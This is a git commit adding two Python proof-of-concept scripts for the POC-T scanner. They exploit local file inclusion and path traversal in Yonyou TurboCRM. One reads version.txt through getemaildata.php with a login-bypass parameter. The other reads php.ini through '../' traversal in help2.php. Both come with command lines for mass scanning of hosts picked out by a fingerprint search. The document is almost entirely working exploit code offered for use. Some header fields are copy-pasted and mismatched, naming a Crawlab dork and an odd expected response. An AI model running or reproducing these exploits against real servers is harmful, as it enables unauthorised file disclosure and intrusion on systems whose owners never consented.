d61d5a3977009aca312b8b560ce68cf49b154bf1
hi-unc1e <root@zuoxueba.org>
2024-07-09 23:00:32 +0800

    update pocs

---
+++ script/turbocrm_lfi_1.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+"""
+@File    :   turbocrm_lfi_1
+@DateTime :  2024/7/9 22:53 
+
+
+@Dork
+    title=="Crawlab | Distributed Web Crawler Platform"
+
+@Cmdline
+    python POC-T.py -s turbocrm_lfi_1.py -aF 'app="用友-TurboCRM" && title=="用友TurboCRM"'
+
+
+@Expected Response
+    n200
+"""
+
+
+from lib.utils.http import request_ex, get_http_url, urljoin_ex
+from lib.utils.dic import Wordlist
+from lib.core.data import logger as log
+
+
+def poc(url):
+    url = urljoin_ex(url, "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt")
+    resp = request_ex("get", url)
+    if resp and resp.status_code == 200:
+        print(url, resp.text)
+        return True
+    else:
+        return False
+
+
+
---
+++ script/turbocrm_lfi_2.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+"""
+@File    :   turbocrm_lfi_1
+@DateTime :  2024/7/9 22:53 
+
+
+@Dork
+    title=="Crawlab | Distributed Web Crawler Platform"
+
+@Cmdline
+    python POC-T.py -s turbocrm_lfi_2.py -aF 'app="用友-TurboCRM" && title=="用友TurboCRM"'
+
+
+@Expected Response
+    n200
+"""
+
+
+from lib.utils.http import request_ex, get_http_url, urljoin_ex
+from lib.utils.dic import Wordlist
+from lib.core.data import logger as log
+
+
+def poc(url):
+    url = urljoin_ex(url, "/pub/help2.php?key=/../../../../../php.ini")
+    resp = request_ex("get", url)
+    if resp and resp.status_code == 200 and "php.ini" in resp.text:
+        # print(url, resp.text)
+        return True
+    else:
+        return False
+
+
+
